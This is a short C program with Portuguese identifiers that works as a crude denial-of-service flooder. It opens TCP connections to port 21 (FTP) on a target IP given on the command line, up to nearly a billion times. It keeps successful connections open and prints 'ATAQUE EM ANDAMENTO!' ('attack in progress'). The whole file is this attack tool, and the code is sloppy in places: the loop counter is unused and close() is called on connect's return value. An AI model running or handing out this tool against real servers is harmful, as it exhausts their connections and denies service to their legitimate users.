#include <stdio.h>
#include <netdb.h>

main(int argc, char *argv[])
{
	int meusocket;
	int conecta;

	int port;
	int inicio = 0;
	int final = 999999999;
	char * site;
	site = argv[1];

	struct sockaddr_in alvo;
	for(port=inicio;port<final;port++)
	{
	meusocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(21);
	alvo.sin_addr.s_addr = inet_addr(site);

	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0){
		printf("ATAQUE EM ANDAMENTO! \n ");
		//close(meusocket);
		//close(conecta);
	}else{
		close(meusocket);
		close(conecta);
}
	}
}
